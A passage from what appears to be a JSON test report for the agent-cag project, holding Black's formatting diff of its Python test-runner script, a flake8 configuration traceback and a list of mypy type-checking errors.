\"Bandit scan failed or not available\"\n-            \n+\n             # Run safety check\n             safety_cmd = [sys.executable, \"-m\", \"safety\", \"check\", \"--json\"]\n-            \n+\n             try:\n-                safety_result = subprocess.run(safety_cmd, capture_output=True, text=True, timeout=60)\n+                safety_result = subprocess.run(\n+                    safety_cmd, capture_output=True, text=True, timeout=60\n+                )\n                 safety_output = safety_result.stdout\n             except:\n                 safety_output = \"Safety check failed or not available\"\n-            \n+\n             return {\n                 \"status\": \"passed\" if pytest_result.returncode == 0 else \"failed\",\n                 \"returncode\": pytest_result.returncode,\n                 \"stdout\": pytest_result.stdout,\n                 \"stderr\": pytest_result.stderr,\n                 \"bandit_output\": bandit_output,\n                 \"safety_output\": safety_output,\n-                \"duration\": 0\n+                \"duration\": 0,\n             }\n         except subprocess.TimeoutExpired:\n             return {\n                 \"status\": \"timeout\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": \"Security tests timed out\",\n-                \"duration\": 300\n+                \"duration\": 300,\n             }\n         except Exception as e:\n             return {\n                 \"status\": \"error\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": str(e),\n-                \"duration\": 0\n-            }\n-    \n+                \"duration\": 0,\n+            }\n+\n     def run_monitoring_tests(self) -> Dict:\n         \"\"\"Run monitoring tests.\"\"\"\n         print(\"\ud83d\udcca Running monitoring tests...\")\n-        \n-        cmd = [\n-            sys.executable, \"-m\", \"pytest\", \n-            \"tests/monitoring/\",\n-            \"-v\", \"--tb=short\"\n-        ]\n-        \n+\n+        cmd = [sys.executable, \"-m\", \"pytest\", \"tests/monitoring/\", \"-v\", \"--tb=short\"]\n+\n         try:\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n-            \n+\n             return {\n                 \"status\": \"passed\" if result.returncode == 0 else \"failed\",\n                 \"returncode\": result.returncode,\n                 \"stdout\": result.stdout,\n                 \"stderr\": result.stderr,\n-                \"duration\": 0\n+                \"duration\": 0,\n             }\n         except subprocess.TimeoutExpired:\n             return {\n                 \"status\": \"timeout\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": \"Monitoring tests timed out\",\n-                \"duration\": 300\n+                \"duration\": 300,\n             }\n         except Exception as e:\n             return {\n                 \"status\": \"error\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": str(e),\n-                \"duration\": 0\n-            }\n-    \n+                \"duration\": 0,\n+            }\n+\n     def run_load_tests(self, users: int = 10, duration: str = \"30s\") -> Dict:\n         \"\"\"Run load tests using locust.\"\"\"\n         print(f\"\u26a1 Running load tests ({users} users for {duration})...\")\n-        \n+\n         # Check if services are running\n         if not self.check_services_running():\n             return {\n                 \"status\": \"skipped\",\n                 \"returncode\": 0,\n                 \"stdout\": \"\",\n                 \"stderr\": \"Services not running, skipping load tests\",\n-                \"duration\": 0\n-            }\n-        \n+                \"duration\": 0,\n+            }\n+\n         cmd = [\n-            sys.executable, \"-m\", \"locust\",\n-            \"-f\", \"tests/load/test_load.py\",\n+            sys.executable,\n+            \"-m\",\n+            \"locust\",\n+            \"-f\",\n+            \"tests/load/test_load.py\",\n             \"--headless\",\n-            \"--users\", str(users),\n-            \"--spawn-rate\", \"2\",\n-            \"--run-time\", duration,\n-            \"--host\", \"http://localhost:8000\"\n+            \"--users\",\n+            str(users),\n+            \"--spawn-rate\",\n+            \"2\",\n+            \"--run-time\",\n+            duration,\n+            \"--host\",\n+            \"http://localhost:8000\",\n         ]\n-        \n+\n         try:\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n-            \n+\n             return {\n                 \"status\": \"passed\" if result.returncode == 0 else \"failed\",\n                 \"returncode\": result.returncode,\n                 \"stdout\": result.stdout,\n                 \"stderr\": result.stderr,\n-                \"duration\": 0\n+                \"duration\": 0,\n             }\n         except subprocess.TimeoutExpired:\n             return {\n                 \"status\": \"timeout\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": \"Load tests timed out\",\n-                \"duration\": 300\n+                \"duration\": 300,\n             }\n         except Exception as e:\n             return {\n                 \"status\": \"error\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": str(e),\n-                \"duration\": 0\n-            }\n-    \n+                \"duration\": 0,\n+            }\n+\n     def run_code_quality_checks(self) -> Dict:\n         \"\"\"Run code quality checks.\"\"\"\n         print(\"\ud83c\udfaf Running code quality checks...\")\n-        \n+\n         results = {}\n-        \n+\n         # Black formatting check\n         try:\n-            black_result = subprocess.run([\n-                sys.executable, \"-m\", \"black\", \"--check\", \"--diff\", \".\"\n-            ], capture_output=True, text=True, timeout=60)\n+            black_result = subprocess.run(\n+                [sys.executable, \"-m\", \"black\", \"--check\", \"--diff\", \".\"],\n+                capture_output=True,\n+                text=True,\n+                timeout=60,\n+            )\n             results[\"black\"] = {\n                 \"status\": \"passed\" if black_result.returncode == 0 else \"failed\",\n-                \"output\": black_result.stdout + black_result.stderr\n+                \"output\": black_result.stdout + black_result.stderr,\n             }\n         except:\n             results[\"black\"] = {\"status\": \"error\", \"output\": \"Black check failed\"}\n-        \n+\n         # Flake8 linting\n         try:\n-            flake8_result = subprocess.run([\n-                sys.executable, \"-m\", \"flake8\", \"api/\", \"asr/\", \"llm/\", \"tts/\", \"tests/\"\n-            ], capture_output=True, text=True, timeout=60)\n+            flake8_result = subprocess.run(\n+                [\n+                    sys.executable,\n+                    \"-m\",\n+                    \"flake8\",\n+                    \"api/\",\n+                    \"asr/\",\n+                    \"llm/\",\n+                    \"tts/\",\n+                    \"tests/\",\n+                ],\n+                capture_output=True,\n+                text=True,\n+                timeout=60,\n+            )\n             results[\"flake8\"] = {\n                 \"status\": \"passed\" if flake8_result.returncode == 0 else \"failed\",\n-                \"output\": flake8_result.stdout + flake8_result.stderr\n+                \"output\": flake8_result.stdout + flake8_result.stderr,\n             }\n         except:\n             results[\"flake8\"] = {\"status\": \"error\", \"output\": \"Flake8 check failed\"}\n-        \n+\n         # MyPy type checking\n         try:\n-            mypy_result = subprocess.run([\n-                sys.executable, \"-m\", \"mypy\", \"api/\", \"asr/\", \"llm/\", \"tts/\"\n-            ], capture_output=True, text=True, timeout=120)\n+            mypy_result = subprocess.run(\n+                [sys.executable, \"-m\", \"mypy\", \"api/\", \"asr/\", \"llm/\", \"tts/\"],\n+                capture_output=True,\n+                text=True,\n+                timeout=120,\n+            )\n             results[\"mypy\"] = {\n                 \"status\": \"passed\" if mypy_result.returncode == 0 else \"failed\",\n-                \"output\": mypy_result.stdout + mypy_result.stderr\n+                \"output\": mypy_result.stdout + mypy_result.stderr,\n             }\n         except:\n             results[\"mypy\"] = {\"status\": \"error\", \"output\": \"MyPy check failed\"}\n-        \n-        overall_status = \"passed\" if all(r[\"status\"] == \"passed\" for r in results.values()) else \"failed\"\n-        \n+\n+        overall_status = (\n+            \"passed\"\n+            if all(r[\"status\"] == \"passed\" for r in results.values())\n+            else \"failed\"\n+        )\n+\n         return {\n             \"status\": overall_status,\n             \"returncode\": 0 if overall_status == \"passed\" else 1,\n             \"results\": results,\n-            \"duration\": 0\n+            \"duration\": 0,\n         }\n-    \n+\n     def check_services_running(self) -> bool:\n         \"\"\"Check if services are running for load tests.\"\"\"\n         try:\n             import httpx\n+\n             response = httpx.get(\"http://localhost:8000/health\", timeout=5)\n             return response.status_code == 200\n         except:\n             return False\n-    \n+\n     def start_services_for_testing(self) -> bool:\n         \"\"\"Start services for integration and load testing.\"\"\"\n         print(\"\ud83d\ude80 Starting services for testing...\")\n-        \n+\n         try:\n             # Start lightweight profile for testing\n-            subprocess.run([\n-                \"docker-compose\", \"-f\", \"docker-compose.local.yml\", \"up\", \"-d\"\n-            ], check=True, capture_output=True)\n-            \n+            subprocess.run(\n+                [\"docker-compose\", \"-f\", \"docker-compose.local.yml\", \"up\", \"-d\"],\n+                check=True,\n+                capture_output=True,\n+            )\n+\n             # Wait for services to be ready\n             time.sleep(10)\n-            \n+\n             if self.check_services_running():\n                 print(\"\u2705 Services started successfully\")\n                 return True\n             else:\n                 print(\"\u274c Services failed to start properly\")\n                 return False\n         except subprocess.CalledProcessError as e:\n             print(f\"\u274c Failed to start services: {e}\")\n             return False\n-    \n+\n     def stop_services(self):\n         \"\"\"Stop test services.\"\"\"\n         print(\"\ud83d\uded1 Stopping test services...\")\n-        \n-        try:\n-            subprocess.run([\n-                \"docker-compose\", \"-f\", \"docker-compose.local.yml\", \"down\"\n-            ], check=True, capture_output=True)\n+\n+        try:\n+            subprocess.run(\n+                [\"docker-compose\", \"-f\", \"docker-compose.local.yml\", \"down\"],\n+                check=True,\n+                capture_output=True,\n+            )\n             print(\"\u2705 Services stopped\")\n         except subprocess.CalledProcessError as e:\n             print(f\"\u26a0\ufe0f  Warning: Failed to stop services: {e}\")\n-    \n+\n     def generate_report(self, output_file: Optional[str] = None):\n         \"\"\"Generate test report.\"\"\"\n         print(\"\ud83d\udccb Generating test report...\")\n-        \n+\n         total_tests = len(self.test_results)\n-        passed_tests = sum(1 for r in self.test_results.values() if r[\"status\"] == \"passed\")\n-        failed_tests = sum(1 for r in self.test_results.values() if r[\"status\"] == \"failed\")\n-        skipped_tests = sum(1 for r in self.test_results.values() if r[\"status\"] == \"skipped\")\n-        \n-        duration = (self.end_time - self.start_time) if self.start_time and self.end_time else 0\n-        \n+        passed_tests = sum(\n+            1 for r in self.test_results.values() if r[\"status\"] == \"passed\"\n+        )\n+        failed_tests = sum(\n+            1 for r in self.test_results.values() if r[\"status\"] == \"failed\"\n+        )\n+        skipped_tests = sum(\n+            1 for r in self.test_results.values() if r[\"status\"] == \"skipped\"\n+        )\n+\n+        duration = (\n+            (self.end_time - self.start_time)\n+            if self.start_time and self.end_time\n+            else 0\n+        )\n+\n         report = {\n             \"summary\": {\n                 \"total_test_suites\": total_tests,\n                 \"passed\": passed_tests,\n                 \"failed\": failed_tests,\n                 \"skipped\": skipped_tests,\n                 \"duration_seconds\": duration,\n-                \"timestamp\": time.strftime(\"%Y-%m-%d %H:%M:%S\")\n+                \"timestamp\": time.strftime(\"%Y-%m-%d %H:%M:%S\"),\n             },\n-            \"results\": self.test_results\n+            \"results\": self.test_results,\n         }\n-        \n+\n         # Print summary\n-        print(\"\\n\" + \"=\"*60)\n+        print(\"\\n\" + \"=\" * 60)\n         print(\"\ud83c\udfaf TEST SUMMARY\")\n-        print(\"=\"*60)\n+        print(\"=\" * 60)\n         print(f\"Total Test Suites: {total_tests}\")\n         print(f\"\u2705 Passed: {passed_tests}\")\n         print(f\"\u274c Failed: {failed_tests}\")\n         print(f\"\u23ed\ufe0f  Skipped: {skipped_tests}\")\n         print(f\"\u23f1\ufe0f  Duration: {duration:.2f} seconds\")\n-        print(\"=\"*60)\n-        \n+        print(\"=\" * 60)\n+\n         # Print detailed results\n         for test_name, result in self.test_results.items():\n             status_emoji = {\n                 \"passed\": \"\u2705\",\n                 \"failed\": \"\u274c\",\n                 \"skipped\": \"\u23ed\ufe0f\",\n                 \"timeout\": \"\u23f0\",\n-                \"error\": \"\ud83d\udca5\"\n+                \"error\": \"\ud83d\udca5\",\n             }.get(result[\"status\"], \"\u2753\")\n-            \n+\n             print(f\"{status_emoji} {test_name.upper()}: {result['status'].upper()}\")\n-            \n-            if result[\"status\"] in [\"failed\", \"error\", \"timeout\"] and result.get(\"stderr\"):\n+\n+            if result[\"status\"] in [\"failed\", \"error\", \"timeout\"] and result.get(\n+                \"stderr\"\n+            ):\n                 print(f\"   Error: {result['stderr'][:200]}...\")\n-        \n+\n         # Save to file if requested\n         if output_file:\n-            with open(output_file, 'w') as f:\n+            with open(output_file, \"w\") as f:\n                 json.dump(report, f, indent=2)\n             print(f\"\\n\ud83d\udcc4 Detailed report saved to: {output_file}\")\n-        \n+\n         return report\n-    \n-    def run_all_tests(self, \n-                     include_load: bool = False,\n-                     include_services: bool = False,\n-                     coverage: bool = True,\n-                     parallel: bool = True,\n-                     load_users: int = 10,\n-                     load_duration: str = \"30s\") -> Dict:\n+\n+    def run_all_tests(\n+        self,\n+        include_load: bool = False,\n+        include_services: bool = False,\n+        coverage: bool = True,\n+        parallel: bool = True,\n+        load_users: int = 10,\n+        load_duration: str = \"30s\",\n+    ) -> Dict:\n         \"\"\"Run all test suites.\"\"\"\n         print(\"\ud83d\ude80 Starting comprehensive test run...\")\n         self.start_time = time.time()\n-        \n+\n         # Setup\n         self.setup_environment()\n-        \n+\n         if not self.install_dependencies():\n             print(\"\u274c Failed to install dependencies, aborting\")\n             return {\"status\": \"error\", \"message\": \"Dependency installation failed\"}\n-        \n+\n         # Start services if needed\n         services_started = False\n         if include_services or include_load:\n             services_started = self.start_services_for_testing()\n-        \n+\n         try:\n             # Run test suites\n             test_suites = [\n-                (\"unit\", lambda: self.run_unit_tests(coverage=coverage, parallel=parallel)),\n+                (\n+                    \"unit\",\n+                    lambda: self.run_unit_tests(coverage=coverage, parallel=parallel),\n+                ),\n                 (\"integration\", self.run_integration_tests),\n                 (\"security\", self.run_security_tests),\n                 (\"monitoring\", self.run_monitoring_tests),\n                 (\"code_quality\", self.run_code_quality_checks),\n             ]\n-            \n+\n             if include_load and services_started:\n                 test_suites.append(\n-                    (\"load\", lambda: self.run_load_tests(users=load_users, duration=load_duration))\n+                    (\n+                        \"load\",\n+                        lambda: self.run_load_tests(\n+                            users=load_users, duration=load_duration\n+                        ),\n+                    )\n                 )\n-            \n+\n             # Run tests sequentially or in parallel\n             for test_name, test_func in test_suites:\n                 print(f\"\\n{'='*20} {test_name.upper()} TESTS {'='*20}\")\n                 self.test_results[test_name] = test_func()\n-                \n+\n                 if self.test_results[test_name][\"status\"] == \"failed\":\n                     print(f\"\u274c {test_name} tests failed\")\n                 elif self.test_results[test_name][\"status\"] == \"passed\":\n                     print(f\"\u2705 {test_name} tests passed\")\n                 else:\n-                    print(f\"\u26a0\ufe0f  {test_name} tests: {self.test_results[test_name]['status']}\")\n-        \n+                    print(\n+                        f\"\u26a0\ufe0f  {test_name} tests: {self.test_results[test_name]['status']}\"\n+                    )\n+\n         finally:\n             # Cleanup\n             if services_started:\n                 self.stop_services()\n-        \n+\n         self.end_time = time.time()\n-        \n+\n         # Generate report\n         report = self.generate_report(\"test_report.json\")\n-        \n+\n         return report\n \n \n def main():\n     \"\"\"Main entry point.\"\"\"\n     parser = argparse.ArgumentParser(description=\"Agent CAG Test Runner\")\n     parser.add_argument(\"--unit\", action=\"store_true\", help=\"Run unit tests only\")\n-    parser.add_argument(\"--integration\", action=\"store_true\", help=\"Run integration tests only\")\n-    parser.add_argument(\"--security\", action=\"store_true\", help=\"Run security tests only\")\n-    parser.add_argument(\"--monitoring\", action=\"store_true\", help=\"Run monitoring tests only\")\n+    parser.add_argument(\n+        \"--integration\", action=\"store_true\", help=\"Run integration tests only\"\n+    )\n+    parser.add_argument(\n+        \"--security\", action=\"store_true\", help=\"Run security tests only\"\n+    )\n+    parser.add_argument(\n+        \"--monitoring\", action=\"store_true\", help=\"Run monitoring tests only\"\n+    )\n     parser.add_argument(\"--load\", action=\"store_true\", help=\"Run load tests only\")\n-    parser.add_argument(\"--code-quality\", action=\"store_true\", help=\"Run code quality checks only\")\n+    parser.add_argument(\n+        \"--code-quality\", action=\"store_true\", help=\"Run code quality checks only\"\n+    )\n     parser.add_argument(\"--all\", action=\"store_true\", help=\"Run all tests\")\n-    parser.add_argument(\"--with-load\", action=\"store_true\", help=\"Include load tests in full run\")\n-    parser.add_argument(\"--with-services\", action=\"store_true\", help=\"Start services for testing\")\n-    parser.add_argument(\"--no-coverage\", action=\"store_true\", help=\"Skip coverage reporting\")\n-    parser.add_argument(\"--no-parallel\", action=\"store_true\", help=\"Disable parallel test execution\")\n-    parser.add_argument(\"--load-users\", type=int, default=10, help=\"Number of users for load testing\")\n-    parser.add_argument(\"--load-duration\", default=\"30s\", help=\"Duration for load testing\")\n+    parser.add_argument(\n+        \"--with-load\", action=\"store_true\", help=\"Include load tests in full run\"\n+    )\n+    parser.add_argument(\n+        \"--with-services\", action=\"store_true\", help=\"Start services for testing\"\n+    )\n+    parser.add_argument(\n+        \"--no-coverage\", action=\"store_true\", help=\"Skip coverage reporting\"\n+    )\n+    parser.add_argument(\n+        \"--no-parallel\", action=\"store_true\", help=\"Disable parallel test execution\"\n+    )\n+    parser.add_argument(\n+        \"--load-users\", type=int, default=10, help=\"Number of users for load testing\"\n+    )\n+    parser.add_argument(\n+        \"--load-duration\", default=\"30s\", help=\"Duration for load testing\"\n+    )\n     parser.add_argument(\"--output\", help=\"Output file for test report\")\n-    \n+\n     args = parser.parse_args()\n-    \n+\n     runner = TestRunner()\n-    \n+\n     # Determine what to run\n-    if args.all or not any([args.unit, args.integration, args.security, args.monitoring, args.load, args.code_quality]):\n+    if args.all or not any(\n+        [\n+            args.unit,\n+            args.integration,\n+            args.security,\n+            args.monitoring,\n+            args.load,\n+            args.code_quality,\n+        ]\n+    ):\n         # Run all tests\n         report = runner.run_all_tests(\n             include_load=args.with_load,\n             include_services=args.with_services,\n             coverage=not args.no_coverage,\n             parallel=not args.no_parallel,\n             load_users=args.load_users,\n-            load_duration=args.load_duration\n+            load_duration=args.load_duration,\n         )\n     else:\n         # Run specific test suites\n         runner.setup_environment()\n         runner.install_dependencies()\n-        \n+\n         if args.with_services:\n             runner.start_services_for_testing()\n-        \n+\n         try:\n             runner.start_time = time.time()\n-            \n+\n             if args.unit:\n                 runner.test_results[\"unit\"] = runner.run_unit_tests(\n-                    coverage=not args.no_coverage,\n-                    parallel=not args.no_parallel\n+                    coverage=not args.no_coverage, parallel=not args.no_parallel\n                 )\n-            \n+\n             if args.integration:\n                 runner.test_results[\"integration\"] = runner.run_integration_tests()\n-            \n+\n             if args.security:\n                 runner.test_results[\"security\"] = runner.run_security_tests()\n-            \n+\n             if args.monitoring:\n                 runner.test_results[\"monitoring\"] = runner.run_monitoring_tests()\n-            \n+\n             if args.load:\n                 runner.test_results[\"load\"] = runner.run_load_tests(\n-                    users=args.load_users,\n-                    duration=args.load_duration\n+                    users=args.load_users, duration=args.load_duration\n                 )\n-            \n+\n             if args.code_quality:\n                 runner.test_results[\"code_quality\"] = runner.run_code_quality_checks()\n-            \n+\n             runner.end_time = time.time()\n             report = runner.generate_report(args.output)\n-        \n+\n         finally:\n             if args.with_services:\n                 runner.stop_services()\n-    \n+\n     # Exit with appropriate code\n-    failed_tests = sum(1 for r in runner.test_results.values() if r[\"status\"] == \"failed\")\n+    failed_tests = sum(\n+        1 for r in runner.test_results.values() if r[\"status\"] == \"failed\"\n+    )\n     sys.exit(1 if failed_tests > 0 else 0)\n \n \n if __name__ == \"__main__\":\n-    main()\n\\ No newline at end of file\n+    main()\nwould reformat /home/pas/source/agent-cag/api/__init__.py\nwould reformat /home/pas/source/agent-cag/asr/__init__.py\nwould reformat /home/pas/source/agent-cag/llm/__init__.py\nwould reformat /home/pas/source/agent-cag/api/models.py\nwould reformat /home/pas/source/agent-cag/test_system.py\nwould reformat /home/pas/source/agent-cag/asr/main.py\nwould reformat /home/pas/source/agent-cag/integration_tests/test_full_pipeline.py\nwould reformat /home/pas/source/agent-cag/tests/unit/test_api.py\nwould reformat /home/pas/source/agent-cag/llm/main.py\nwould reformat /home/pas/source/agent-cag/api/main.py\nwould reformat /home/pas/source/agent-cag/api/database.py\nwould reformat /home/pas/source/agent-cag/tts/__init__.py\nwould reformat /home/pas/source/agent-cag/benchmark/run_benchmarks.py\nwould reformat /home/pas/source/agent-cag/tests/load/test_load.py\nwould reformat /home/pas/source/agent-cag/tests/unit/test_database.py\nwould reformat /home/pas/source/agent-cag/tests/unit/test_asr.py\nwould reformat /home/pas/source/agent-cag/tests/integration/test_enhanced_integration.py\nwould reformat /home/pas/source/agent-cag/tests/unit/test_llm.py\nwould reformat /home/pas/source/agent-cag/tts/main.py\nwould reformat /home/pas/source/agent-cag/tests/security/test_security.py\nwould reformat /home/pas/source/agent-cag/check_system.py\nwould reformat /home/pas/source/agent-cag/tests/unit/test_tts.py\nwould reformat /home/pas/source/agent-cag/tests/monitoring/test_monitoring.py\nwould reformat /home/pas/source/agent-cag/run_tests.py\n\nOh no! \ud83d\udca5 \ud83d\udc94 \ud83d\udca5\n24 files would be reformatted.\n"
        },
        "flake8": {
          "status": "failed",
          "output": "Traceback (most recent call last):\n  File \"<frozen runpy>\", line 198, in _run_module_as_main\n  File \"<frozen runpy>\", line 88, in _run_code\n  File \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/flake8/__main__.py\", line 7, in <module>\n    raise SystemExit(main())\n                     ^^^^^^\n  File \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/flake8/main/cli.py\", line 23, in main\n    app.run(argv)\n  File \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/flake8/main/application.py\", line 198, in run\n    self._run(argv)\n  File \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/flake8/main/application.py\", line 186, in _run\n    self.initialize(argv)\n  File \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/flake8/main/application.py\", line 165, in initialize\n    self.plugins, self.options = parse_args(argv)\n                                 ^^^^^^^^^^^^^^^^\n  File \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/flake8/options/parse_args.py\", line 53, in parse_args\n    opts = aggregator.aggregate_options(option_manager, cfg, cfg_dir, rest)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/flake8/options/aggregator.py\", line 30, in aggregate_options\n    parsed_config = config.parse_config(manager, cfg, cfg_dir)\n                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/home/pas/source/agent-cag/.venv/lib/python3.12/site-packages/flake8/options/config.py\", line 131, in parse_config\n    raise ValueError(\nValueError: Error code '#' supplied to 'ignore' option does not match '^[A-Z]{1,3}[0-9]{0,3}$'\n"
        },
        "mypy": {
          "status": "failed",
          "output": "api/database.py:16: error: Cannot find implementation or library stub for module named \"models\"  [import-not-found]\napi/database.py:16: note: See https://mypy.readthedocs.io/en/stable/running_mypy.html#missing-imports\napi/database.py:25: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:25: note: Use \"-> None\" if function does not return a value\napi/database.py:30: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:30: note: Use \"-> None\" if function does not return a value\napi/database.py:35: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:35: note: Use \"-> None\" if function does not return a value\napi/database.py:67: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:67: note: Use \"-> None\" if function does not return a value\napi/database.py:82: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:82: note: Use \"-> None\" if function does not return a value\napi/database.py:85: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:93: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:105: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:117: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:129: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:140: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:140: note: Use \"-> None\" if function does not return a value\napi/database.py:143: error: Statement is unreachable  [unreachable]\napi/database.py:146: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:146: note: Use \"-> None\" if function does not return a value\napi/database.py:152: error: Statement is unreachable  [unreachable]\napi/database.py:161: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:167: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:179: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:190: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:194: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:201: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:227: error: \"None\" has no attribute \"execute\"  [attr-defined]\napi/database.py:249: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:249: note: Use \"-> None\" if function does not return a value\napi/database.py:253: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:253: note: Use \"-> None\" if function does not return a value\napi/database.py:290: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:290: note: Use \"-> None\" if function does not return a value\napi/database.py:294: error: Item \"None\" of \"Optional[Any]\" has no attribute \"create_collection\"  [union-attr]\napi/database.py:300: error: Item \"None\" of \"Optional[Any]\" has no attribute \"session\"  [union-attr]\napi/database.py:305: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:305: note: Use \"-> None\" if function does not return a value\napi/database.py:311: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:311: note: Use \"-> None\" if function does not return a value\napi/database.py:330: error: Item \"None\" of \"Optional[Any]\" has no attribute \"session\"  [union-attr]\napi/database.py:348: error: Item \"None\" of \"Optional[Any]\" has no attribute \"session\"  [union-attr]\napi/database.py:364: error: Item \"None\" of \"Optional[Any]\" has no attribute \"session\"  [union-attr]\napi/database.py:387: error: Item \"None\" of \"Optional[Any]\" has no attribute \"get_collection\"  [union-attr]\napi/database.py:415: error: Incompatible types in assignment (expression has type \"FullStackBackend\", variable has type \"DuckDBBackend\")  [assignment]\napi/database.py:419: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:419: note: Use \"-> None\" if function does not return a value\napi/database.py:423: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:423: note: Use \"-> None\" if function does not return a value\napi/database.py:427: error: Function is missing a return type annotation  [no-untyped-def]\napi/database.py:427: note: Use \"-> None\" if function does not return a value\ntts/main.py:55: error: Function is missing a return type annotation  [no-untyped-def]\ntts/main.py:55: note: Use \"-> None\" if function does not return a value\ntts/main.py:82: error: Function is missing a return type annotation  [no-untyped-def]\ntts/main.py:82: note: Use \"-> None\" if function does not return a value\ntts/main.py:101: error: Function is missing a return type annotation  [no-untyped-def]\ntts/main.py:119: error: Function is missing a return type annotation  [no-untyped-def]\ntts/main.py:125: error: Function is missing a return type annotation  [no-untyped-def]\ntts/main.py:175: error: Function is missing a return type annotation  [no-untyped-def]\ntts/main.py:207: error: Returning Any from function declared to return \"str\"  [no-any-return]\ntts/main.py:228: error: Function is missing a return type annotation  [no-untyped-def]\ntts/main.py:260: error: Returning Any from function declared to return \"Optional[float]\"  [no-any-return]\ntts/main.py:267: error: Function is missing a return type annotation  [no-untyped-def]\ntts/main.py:289: error: Function is missing a type annotation  [no-untyped-def]\ntts/main.py:300: error: Cannot find implementation or library stub for module named \"uvicorn\"  [import-not-found]\nllm/main.py:17: error: Cannot find implementation or library stub for module named \"ollama\"  [import-not-found]\nllm/main.py:52: error: Function is missing a return type annotation  [no-untyped-def]\nllm/main.py:85: error: Function is missing a return type annotation  [no-untyped-def]\nllm/main.py:85: note: Use \"-> None\" if function does not return a value\nllm/main.py:137: error: Function is missing a return type annotation  [no-untyped-def]\nllm/main.py:137: note: Use \"-> None\" if function does not return a value\nllm/main.py:153: error: Function is missing a return type annotation  [no-untyped-def]\nllm/main.py:174: error: Function is missing a return type annotation  [no-untyped-def]\nllm/main.py:180: error: Function is missing a return type annotation  [no-untyped-def]\nllm/main.py:206: error: Argument \"model\" to \"GenerationResponse\" has incompatible type \"Optional[str]\"; expected \"str\"  [arg-type]\nllm/main.py:268: error: Function is missing a return type annotation  [no-untyped-def]\nllm/main.py:286: error: Function is missing a return type annotation  [no-untyped-def]\nllm/main.py:309: error: Function is missing a type annotation  [no-untyped-def]\nllm/main.py:320: error: Cannot find implementation or library stub for module named \"uvicorn\"  [import-not-found]\nasr/main.py:35: error: Function is missing a return type annotation  [no-untyped-def]\nasr/main.py:35: note: Use \"-> None\" if function does not return a value\nasr/main.py:64: error: Function is missing a return type annotation  [no-untyped-def]\nasr/main.py:64: note: Use \"-> None\" if function does not return a value\nasr/main.py:80: error: Function is missing a return type annotation  [no-untyped-def]\nasr/main.py:98: error: Function is missing a return type annotation  [no-untyped-def]\nasr/main.py:104: error: Function is missing a return type annotation  [no-untyped-def]\nasr/main.py:114: error: Item \"None\" of \"Optional[str]\" has no attribute \"startswith\"  [union-attr]\nasr/main.py:152: error: Function is missing a return type annotation  [no-untyped-def]\nasr/main.py:168: error: Function is missing a return type annotation  [no-untyped-def]\nasr/main.py:168: error: Function is missing a type annotation for one or more arguments  [no-untyped-def]\nasr/main.py:190: error: Function is missing a type annotation  [no-untyped-def]\nasr/main.py:217: error: Function is missing a return type annotation  [no-untyped-def]\nasr/main.py:217: note: Use \"-> None\" if function does not return a value\nasr/main.py:226: error: Function is missing a type annotation  [no-untyped-def]\nasr/main.py:238: error: Cannot find implementation or library stub for module named \"uvicorn\"  [import-not-found]\napi/main.py:20: error: Cannot find implementation or library stub for module named \"database\"  [import-not-found]\napi/main.py:21: error: Cannot find implementation or library stub for module named \"models\"  [import-not-found]\napi/main.py:38: error: Function is missing a return type annotation  [no-untyped-def]\napi/main.py:75: error: Function is missing a return type annotation  [no-untyped-def]\napi/main.py:75: error: Function is missing a type annotation for one or more arguments  [no-untyped-def]\napi/main.py:86: error: Function is missing a return type annotation  [no-untyped-def]\napi/main.py:105: error: Function is missing a return type annotation  [no-untyped-def]\napi/main.py:111: error: Function is missing a return type annotation  [no-untyped-def]\napi/main.py:118: error: Item \"None\" of \"Optional[Any]\" has no attribute \"store_query\"  [union-attr]\napi/main.py:128: error: Item \"None\" of \"Optional[Any]\" has no attribute \"store_response\"  [union-attr]\napi/main.py:157: error: Function is missing a return type annotation  [no-untyped-def]\napi/main.py:167: error: Argument \"headers\" to \"post\" of \"AsyncClient\" has incompatible type \"Dict[str, Optional[str]]\"; 